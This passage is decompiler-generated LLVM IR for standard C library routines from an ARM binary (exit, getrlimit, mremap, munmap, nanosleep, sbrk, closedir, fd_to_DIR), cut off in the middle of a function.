  store i32 %v3_137c0, i32* %stack_var_-8, align 4
  %v0_137cc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_137cc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_137cc, -4095
  br i1 %tmp, label %dec_label_pc_137f4, label %dec_label_pc_137dc

dec_label_pc_137dc:                               ; preds = %entry
  %v0_137e0 = call i32 @__aeabi_read_tp()
  %v3_137e4 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_137e4 = sext i16 %v3_137e4 to i32
  %v0_137e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_137e8 = sub i32 0, %v0_137e8
  store i32 %v1_137e8, i32* %r2.global-to-local, align 4
  %v3_137ec = add i32 %v4_137e4, %v0_137e0
  %v4_137ec = inttoptr i32 %v3_137ec to i32*
  store i32 %v1_137e8, i32* %v4_137ec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_137f4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_137f4

dec_label_pc_137f4:                               ; preds = %entry, %dec_label_pc_137dc
  %v1_137f8 = phi i32 [ %v0_137cc, %entry ], [ -1, %dec_label_pc_137dc ]
  %v2_137f4 = phi i32 [ %v3_137c0, %entry ], [ %v2_137f4.pre, %dec_label_pc_137dc ]
  store i32 %v2_137f4, i32* @r7, align 4
  ret i32 %v1_137f8

; uselistorder directives
  uselistorder i32 %v0_137cc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_137f4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1380c

dec_label_pc_1380c:                               ; preds = %dec_label_pc_13838, %dec_label_pc_1384c, %entry
  %v0_1380c = phi i32 [ %arg1, %entry ], [ %v0_1380c.pre.pre, %dec_label_pc_1384c ], [ %v0_13838, %dec_label_pc_13838 ]
  store i32 %v0_1380c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1380c, -4095
  br i1 %tmp, label %dec_label_pc_13838, label %dec_label_pc_13828

dec_label_pc_13828:                               ; preds = %dec_label_pc_1380c
  %v0_13828 = call i32 @__aeabi_read_tp()
  %v0_1382c = load i32, i32* %r2.global-to-local, align 4
  %v1_1382c = sub i32 0, %v0_1382c
  store i32 %v1_1382c, i32* %r2.global-to-local, align 4
  %v3_13830 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_13830 = sext i16 %v3_13830 to i32
  %v3_13834 = add i32 %v4_13830, %v0_13828
  %v4_13834 = inttoptr i32 %v3_13834 to i32*
  store i32 %v1_1382c, i32* %v4_13834, align 4
  %v0_13838.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13838

dec_label_pc_13838:                               ; preds = %dec_label_pc_1380c, %dec_label_pc_13828
  %v0_13838 = phi i32 [ %v0_1380c, %dec_label_pc_1380c ], [ %v0_13838.pre, %dec_label_pc_13828 ]
  store i32 %v0_13838, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_13838, -4095
  br i1 %tmp4, label %dec_label_pc_1380c, label %dec_label_pc_1384c

dec_label_pc_1384c:                               ; preds = %dec_label_pc_13838
  %v0_1384c = call i32 @__aeabi_read_tp()
  %v0_13850 = load i32, i32* %r2.global-to-local, align 4
  %v1_13850 = sub i32 0, %v0_13850
  store i32 %v1_13850, i32* %r2.global-to-local, align 4
  %v3_13854 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_13854 = sext i16 %v3_13854 to i32
  %v3_13858 = add i32 %v4_13854, %v0_1384c
  %v4_13858 = inttoptr i32 %v3_13858 to i32*
  store i32 %v1_13850, i32* %v4_13858, align 4
  %v0_1380c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1380c

; uselistorder directives
  uselistorder i32 %v0_13838, { 0, 2, 1 }
  uselistorder i32 %v0_1380c, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13838, { 1, 0 }
  uselistorder label %dec_label_pc_1380c, { 1, 0, 2 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_1386c = ptrtoint i32* %stack_var_-16 to i32
  %v2_13878 = call i32 @getrlimit(i32 7, i32 %v2_1386c)
  %v1_1387c = icmp slt i32 %v2_13878, 0
  %v5_13880 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_1387c, i32 256, i32 %v5_13880
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_138a4 = load i32, i32* @r0, align 4
  ret i32 %v1_138a4
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_138b8 = load i32, i32* @r0, align 4
  ret i32 %v1_138b8
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_138cc = load i32, i32* @r0, align 4
  ret i32 %v1_138cc
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_138dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 148) to i32*), align 4
  %v1_138e0 = inttoptr i32 %v4_138dc to i32*
  %v2_138e0 = load i32, i32* %v1_138e0, align 4
  %v2_138e4 = icmp eq i32 %v2_138e0, 0
  br i1 %v2_138e4, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_138ec = phi i32 [ %v2_138e0, %entry ], [ 4096, %bb ]
  ret i32 %v1_138ec

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13924, label %dec_label_pc_1390c

dec_label_pc_1390c:                               ; preds = %entry
  %v1_13910 = sub i32 0, %arg1
  %v3_13914 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_13914 = sext i16 %v3_13914 to i32
  %v0_13918 = call i32 @__aeabi_read_tp()
  %v3_1391c = add i32 %v4_13914, %v0_13918
  %v4_1391c = inttoptr i32 %v3_1391c to i32*
  store i32 %v1_13910, i32* %v4_1391c, align 4
  br label %dec_label_pc_13924

dec_label_pc_13924:                               ; preds = %entry, %dec_label_pc_1390c
  %v1_13928 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1390c ]
  ret i32 %v1_13928

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13924, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13930 = load i32, i32* @r7, align 4
  store i32 %v3_13930, i32* %stack_var_-8, align 4
  %v0_1393c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1393c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1393c, -4095
  br i1 %tmp, label %dec_label_pc_13964, label %dec_label_pc_1394c

dec_label_pc_1394c:                               ; preds = %entry
  %v0_13950 = call i32 @__aeabi_read_tp()
  %v3_13954 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_13954 = sext i16 %v3_13954 to i32
  store i32 %v4_13954, i32* @r3, align 4
  %v0_13958 = load i32, i32* %r2.global-to-local, align 4
  %v1_13958 = sub i32 0, %v0_13958
  store i32 %v1_13958, i32* %r2.global-to-local, align 4
  %v3_1395c = add i32 %v4_13954, %v0_13950
  %v4_1395c = inttoptr i32 %v3_1395c to i32*
  store i32 %v1_13958, i32* %v4_1395c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13964.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13964

dec_label_pc_13964:                               ; preds = %entry, %dec_label_pc_1394c
  %v1_13968 = phi i32 [ %v0_1393c, %entry ], [ -1, %dec_label_pc_1394c ]
  %v2_13964 = phi i32 [ %v3_13930, %entry ], [ %v2_13964.pre, %dec_label_pc_1394c ]
  store i32 %v2_13964, i32* @r7, align 4
  ret i32 %v1_13968

; uselistorder directives
  uselistorder i32 %v0_1393c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13964, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_13980 = load i32, i32* @r0, align 4
  ret i32 %v1_13980
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13984 = load i32, i32* @r4, align 4
  store i32 %v3_13984, i32* %stack_var_-12, align 4
  %v0_13994 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13994, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13994, -4095
  br i1 %tmp, label %dec_label_pc_139bc, label %dec_label_pc_139a4

dec_label_pc_139a4:                               ; preds = %entry
  %v0_139a8 = call i32 @__aeabi_read_tp()
  %v3_139ac = load i16, i16* @global_var_20d4c.598, align 2
  %v4_139ac = sext i16 %v3_139ac to i32
  %v0_139b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_139b0 = sub i32 0, %v0_139b0
  store i32 %v1_139b0, i32* %r2.global-to-local, align 4
  %v3_139b4 = add i32 %v4_139ac, %v0_139a8
  %v4_139b4 = inttoptr i32 %v3_139b4 to i32*
  store i32 %v1_139b0, i32* %v4_139b4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_139bc.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_139bc

dec_label_pc_139bc:                               ; preds = %entry, %dec_label_pc_139a4
  %v1_139c0 = phi i32 [ %v0_13994, %entry ], [ -1, %dec_label_pc_139a4 ]
  %v2_139bc = phi i32 [ %v3_13984, %entry ], [ %v2_139bc.pre, %dec_label_pc_139a4 ]
  store i32 %v2_139bc, i32* @r4, align 4
  ret i32 %v1_139c0

; uselistorder directives
  uselistorder i32 %v0_13994, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_139bc, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_139c8 = load i32, i32* @r7, align 4
  store i32 %v3_139c8, i32* %stack_var_-8, align 4
  %v0_139d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_139d4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_139d4, -4095
  br i1 %tmp, label %dec_label_pc_139fc, label %dec_label_pc_139e4

dec_label_pc_139e4:                               ; preds = %entry
  %v0_139e8 = call i32 @__aeabi_read_tp()
  %v3_139ec = load i16, i16* @global_var_20d4c.598, align 2
  %v4_139ec = sext i16 %v3_139ec to i32
  %v0_139f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_139f0 = sub i32 0, %v0_139f0
  store i32 %v1_139f0, i32* %r2.global-to-local, align 4
  %v3_139f4 = add i32 %v4_139ec, %v0_139e8
  %v4_139f4 = inttoptr i32 %v3_139f4 to i32*
  store i32 %v1_139f0, i32* %v4_139f4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_139fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_139fc

dec_label_pc_139fc:                               ; preds = %entry, %dec_label_pc_139e4
  %v1_13a00 = phi i32 [ %v0_139d4, %entry ], [ -1, %dec_label_pc_139e4 ]
  %v2_139fc = phi i32 [ %v3_139c8, %entry ], [ %v2_139fc.pre, %dec_label_pc_139e4 ]
  store i32 %v2_139fc, i32* @r7, align 4
  ret i32 %v1_13a00

; uselistorder directives
  uselistorder i32 %v0_139d4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_139fc, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13a08 = load i32, i32* @r7, align 4
  store i32 %v3_13a08, i32* %stack_var_-8, align 4
  %v0_13a14 = load i32, i32* @r0, align 4
  store i32 %v0_13a14, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13a14, -4095
  br i1 %tmp, label %dec_label_pc_13a3c, label %dec_label_pc_13a24

dec_label_pc_13a24:                               ; preds = %entry
  %v0_13a28 = call i32 @__aeabi_read_tp()
  %v3_13a2c = load i16, i16* @global_var_20d4c.598, align 2
  %v4_13a2c = sext i16 %v3_13a2c to i32
  %v0_13a30 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a30 = sub i32 0, %v0_13a30
  store i32 %v1_13a30, i32* %r2.global-to-local, align 4
  %v3_13a34 = add i32 %v4_13a2c, %v0_13a28
  %v4_13a34 = inttoptr i32 %v3_13a34 to i32*
  store i32 %v1_13a30, i32* %v4_13a34, align 4
  %v2_13a3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13a3c

dec_label_pc_13a3c:                               ; preds = %entry, %dec_label_pc_13a24
  %v1_13a40 = phi i32 [ %v0_13a14, %entry ], [ -1, %dec_label_pc_13a24 ]
  %v2_13a3c = phi i32 [ %v3_13a08, %entry ], [ %v2_13a3c.pre, %dec_label_pc_13a24 ]
  store i32 %v2_13a3c, i32* @r7, align 4
  ret i32 %v1_13a40

; uselistorder directives
  uselistorder i32 %v0_13a14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13a3c, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_13a54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 12684) to i32*), align 4
  %v2_13a58 = icmp eq i32 %v4_13a54, 0
  %v3_13a5c = load i32, i32* @r4, align 4
  %v9_13a5c = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13a58, label %dec_label_pc_13a6c, label %entry.dec_label_pc_13a74_crit_edge

entry.dec_label_pc_13a74_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13a74

dec_label_pc_13a6c:                               ; preds = %entry
  store i32 %v3_13a5c, i32* @r4, align 4
  store i32 %v9_13a5c, i32* @r6, align 4
  %v0_13a70 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_13a74

dec_label_pc_13a74:                               ; preds = %entry.dec_label_pc_13a74_crit_edge, %dec_label_pc_13a6c
  %v0_13a74 = call i32 @__libc_enable_asynccancel()
  %v0_13a78 = load i32, i32* @r6, align 4
  store i32 %v0_13a78, i32* @r1, align 4
  store i32 %v0_13a74, i32* @r5, align 4
  %v0_13a80 = load i32, i32* @r4, align 4
  store i32 %v0_13a80, i32* @r0, align 4
  %v0_13a84 = call i32 @__syscall_nanosleep()
  store i32 %v0_13a84, i32* @r4, align 4
  %v0_13a8c = load i32, i32* @r5, align 4
  %v1_13a90 = call i32 @__libc_disable_asynccancel(i32 %v0_13a8c)
  %v0_13a94 = load i32, i32* @r4, align 4
  ret i32 %v0_13a94

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 13, 7, 12, 1, 3, 2, 6, 5, 11, 4, 10, 9, 8, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 13, 7, 12, 1, 3, 2, 6, 5, 11, 4, 10, 9, 8, 0 }
  uselistorder label %dec_label_pc_13a74, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13aa8 = load i32, i32* @r4, align 4
  store i32 %v3_13aa8, i32* %stack_var_-16, align 4
  store i32 11572, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r4.global-to-local, align 4
  %v4_13ab8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 11572) to i32*), align 4
  %v2_13abc = icmp eq i32 %v4_13ab8, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_13abc, label %dec_label_pc_13ac8, label %dec_label_pc_13ad8

dec_label_pc_13ac8:                               ; preds = %entry
  %v1_13acc = call i32 @__GI_brk(i32 0)
  %v1_13ad0 = icmp slt i32 %v1_13acc, 0
  br i1 %v1_13ad0, label %dec_label_pc_13afc, label %dec_label_pc_13ad8thread-pre-split

dec_label_pc_13ad8thread-pre-split:               ; preds = %dec_label_pc_13ac8
  %v0_13adc.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_13ad8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13ad8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13ad8

dec_label_pc_13ad8:                               ; preds = %dec_label_pc_13ad8thread-pre-split, %entry
  %v1_13ad8 = phi i32 [ %v1_13ad8.pre, %dec_label_pc_13ad8thread-pre-split ], [ 11572, %entry ]
  %v0_13ad8 = phi i32 [ %v0_13ad8.pre, %dec_label_pc_13ad8thread-pre-split ], [ ptrtoint (i32* @global_var_20cf4.602 to i32), %entry ]
  %v1_13aec = phi i32 [ %v0_13adc.pr, %dec_label_pc_13ad8thread-pre-split ], [ %arg1, %entry ]
  %v2_13ad8 = add i32 %v0_13ad8, %v1_13ad8
  %v3_13ad8 = inttoptr i32 %v2_13ad8 to i32*
  %v4_13ad8 = load i32, i32* %v3_13ad8, align 4
  %v2_13adc = icmp eq i32 %v1_13aec, 0
  store i32 %v4_13ad8, i32* %r4.global-to-local, align 4
  br i1 %v2_13adc, label %dec_label_pc_13b00, label %dec_label_pc_13ae8

dec_label_pc_13ae8:                               ; preds = %dec_label_pc_13ad8
  %v2_13aec = add i32 %v4_13ad8, %v1_13aec
  %v1_13af0 = call i32 @__GI_brk(i32 %v2_13aec)
  %v1_13af4 = icmp slt i32 %v1_13af0, 0
  br i1 %v1_13af4, label %dec_label_pc_13afc, label %dec_label_pc_13ae8.dec_label_pc_13b00_crit_edge

dec_label_pc_13ae8.dec_label_pc_13b00_crit_edge:  ; preds = %dec_label_pc_13ae8
  %v0_13b00.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13b00

dec_label_pc_13afc:                               ; preds = %dec_label_pc_13ae8, %dec_label_pc_13ac8
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13b00

dec_label_pc_13b00:                               ; preds = %dec_label_pc_13ad8, %dec_label_pc_13ae8.dec_label_pc_13b00_crit_edge, %dec_label_pc_13afc
  %v0_13b00 = phi i32 [ %v0_13b00.pre, %dec_label_pc_13ae8.dec_label_pc_13b00_crit_edge ], [ -1, %dec_label_pc_13afc ], [ %v4_13ad8, %dec_label_pc_13ad8 ]
  %v2_13b04 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13b04, i32* @r4, align 4
  ret i32 %v0_13b00

; uselistorder directives
  uselistorder i32 %v4_13ad8, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_13b00, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_13b24 = load i32, i32* @r0, align 4
  ret i32 %v1_13b24
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_13b2c = load i32, i32* %arg1, align 4
  store i32 %v2_13b2c, i32* %r3.global-to-local, align 4
  %v3_13b34 = icmp eq i32 %v2_13b2c, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r6, align 4
  br i1 %v3_13b34, label %dec_label_pc_13b48, label %dec_label_pc_13b64

dec_label_pc_13b48:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_d1f4.128 to i32), i32* %r2.global-to-local, align 4
  %v0_13b4c = call i32 @__aeabi_read_tp()
  %v3_13b50 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_13b50 = sext i16 %v3_13b50 to i32
  store i32 %v4_13b50, i32* %r2.global-to-local, align 4
  %v0_13b54 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_13b54, i32* %r1.global-to-local, align 4
  %v1_13b58 = add i32 %v0_13b54, 10
  store i32 %v1_13b58, i32* %r3.global-to-local, align 4
  %v3_13b5c = add i32 %v4_13b50, %v0_13b4c
  %v4_13b5c = inttoptr i32 %v3_13b5c to i32*
  store i32 %v1_13b58, i32* %v4_13b5c, align 4
  %v0_13c0c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13c0c

dec_label_pc_13b64:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_13b68 = add i32 %tmp, 24
  store i32 %v1_13b68, i32* %r2.global-to-local, align 4
  %v4_13b70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 68) to i32*), align 4
  store i32 %v4_13b70, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_13b7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13b7c)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_13b94 = load i32, i32* @r6, align 4
  %v2_13b94 = add i32 %v0_13b94, 16
  %v3_13b94 = inttoptr i32 %v2_13b94 to i32*
  %v4_13b94 = load i32, i32* %v3_13b94, align 4
  call void @__pseudo_branch(i32 %v4_13b94)
  %v0_13ba0 = load i32, i32* @r7, align 4
  %v1_13ba0 = inttoptr i32 %v0_13ba0 to i32*
  %v2_13ba0 = load i32, i32* %v1_13ba0, align 4
  store i32 %v2_13ba0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_13bb0 = load i32, i32* @r8, align 4
  store i32 %v0_13bb0, i32* %v1_13ba0, align 4
  %v0_13bb4 = load i32, i32* @r6, align 4
  %v1_13bb4 = load i32, i32* %r3.global-to-local, align 4
  %v2_13bb4 = add i32 %v1_13bb4, %v0_13bb4
  %v3_13bb4 = inttoptr i32 %v2_13bb4 to i32*
  %v4_13bb4 = load i32, i32* %v3_13bb4, align 4
  store i32 ptrtoint (i32* @global_var_13bc0.823 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13bb4)
  %v0_13bc0 = load i32, i32* @r7, align 4
  %v1_13bc0 = add i32 %v0_13bc0, 12
  %v2_13bc0 = inttoptr i32 %v1_13bc0 to i32*
  %v3_13bc0 = load i32, i32* %v2_13bc0, align 4
  store i32 %v3_13bc0, i32* @r0, align 4
  %v0_13bc4 = call i32 @free()
  %v0_13bc8 = load i32, i32* @r7, align 4
  store i32 %v0_13bc8, i32* @r0, align 4
  %v0_13bcc = call i32 @free()
  %v0_13bd4 = load i32, i32* @r4, align 4
  store i32 %v0_13bd4, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_13bd4, -4095
  br i1 %tmp11, label %dec_label_pc_13c08, label %dec_label_pc_13bf0

dec_label_pc_13bf0:                               ; preds = %dec_label_pc_13b64
  store i32 ptrtoint (i32* @global_var_d14c.411 to i32), i32* %r3.global-to-local, align 4
  %v0_13bf4 = call i32 @__aeabi_read_tp()
  %v3_13bf8 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_13bf8 = sext i16 %v3_13bf8 to i32
  store i32 %v4_13bf8, i32* %r3.global-to-local, align 4
  %v0_13bfc = load i32, i32* %r2.global-to-local, align 4
  %v1_13bfc = sub i32 0, %v0_13bfc
  store i32 %v1_13bfc, i32* %r2.global-to-local, align 4
  %v3_13c00 = add i32 %v4_13bf8, %v0_13bf4
  %v4_13c00 = inttoptr i32 %v3_13c00 to i32*
  store i32 %v1_13bfc, i32* %v4_13c00, align 4
  %v0_13c04 = load i32, i32* @r8, align 4
  br label %dec_label_pc_13c08

dec_label_pc_13c08:                               ; preds = %dec_label_pc_13b64, %dec_label_pc_13bf0
  %v0_13c08 = phi i32 [ %v0_13bd4, %dec_label_pc_13b64 ], [ %v0_13c04, %dec_label_pc_13bf0 ]
  store i32 %v0_13c08, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13c0c

dec_label_pc_13c0c:                               ; preds = %dec_label_pc_13b48, %dec_label_pc_13c08
  %v0_13c0c = phi i32 [ %v0_13c0c.pre, %dec_label_pc_13b48 ], [ %v0_13c08, %dec_label_pc_13c08 ]
  ret i32 %v0_13c0c

; uselistorder directives
  uselistorder i32 %v0_13bd4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c0c, { 1, 0 }
  uselistorder label %dec_label_pc_13c08, { 1, 0 }
}

define i32 @function_13c24(i32 %arg1) local_unnamed_addr {
dec_label_pc_13c24:
  %v0_13c24 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13c24, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_13c24
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13c24, %bb
  %v7_13c34 = phi i32 [ %arg1, %dec_label_pc_13c24 ], [ 0, %bb ]
  ret i32 %v7_13c34

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_13c38 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_13c4c = call i32 @malloc()
  %v2_13c54 = icmp eq i32 %v0_13c4c, 0
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r6, align 4
  br i1 %v2_13c54, label %bb, label %dec_label_pc_13c64

bb:                                               ; preds = %entry
  br label %dec_label_pc_13cf0

dec_label_pc_13c64:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_13c68 = load i32, i32* @r4, align 4
  %v2_13c68 = icmp ugt i32 %v0_13c68, 511
  %v2_13c6c = add i32 %v0_13c4c, 4
  %v3_13c6c = inttoptr i32 %v2_13c6c to i32*
  store i32 0, i32* %v3_13c6c, align 4
  %v0_13c70 = load i32, i32* %r3.global-to-local, align 4
  %v2_13c70 = add i32 %v0_13c4c, 16
  %v3_13c70 = inttoptr i32 %v2_13c70 to i32*
  store i32 %v0_13c70, i32* %v3_13c70, align 4
  %v0_13c74 = load i32, i32* %r3.global-to-local, align 4
  %v2_13c74 = add i32 %v0_13c4c, 8
  %v3_13c74 = inttoptr i32 %v2_13c74 to i32*
  store i32 %v0_13c74, i32* %v3_13c74, align 4
  br i1 %v2_13c68, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_13c64
  %v0_13c7c2 = load i32, i32* @r4, align 4
  %v2_13c7c3 = add i32 %v0_13c4c, 20
  %v3_13c7c4 = inttoptr i32 %v2_13c7c3 to i32*
  store i32 %v0_13c7c2, i32* %v3_13c7c4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_13c64
  %v1_13c78 = load i32, i32* %r3.global-to-local, align 4
  %v2_13c78 = add i32 %v1_13c78, 512
  store i32 %v2_13c78, i32* %r3.global-to-local, align 4
  %v0_13c7c = load i32, i32* @r4, align 4
  %v2_13c7c = add i32 %v0_13c4c, 20
  %v3_13c7c = inttoptr i32 %v2_13c7c to i32*
  store i32 %v0_13c7c, i32* %v3_13c7c, align 4
  %v1_13c80 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_13c80, i32* %v3_13c7c, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_13c4c, i32* @r5, align 4
  %v0_13c88 = load i32, i32* @r7, align 4
  %v2_13c88 = inttoptr i32 %v0_13c4c to i32*
  store i32 %v0_13c88, i32* %v2_13c88, align 4
  %v0_13c8c = load i32, i32* @r5, align 4
  %v1_13c8c = add i32 %v0_13c8c, 20
  %v2_13c8c = inttoptr i32 %v1_13c8c to i32*
  %v3_13c8c = load i32, i32* %v2_13c8c, align 4
  store i32 %v3_13c8c, i32* %r1.global-to-local, align 4
  %v2_13c94 = call i32 @calloc(i32 1, i32 %v3_13c8c)
  %v2_13c98 = icmp eq i32 %v2_13c94, 0
  store i32 %v2_13c94, i32* @r4, align 4
  %v1_13ca0 = load i32, i32* @r5, align 4
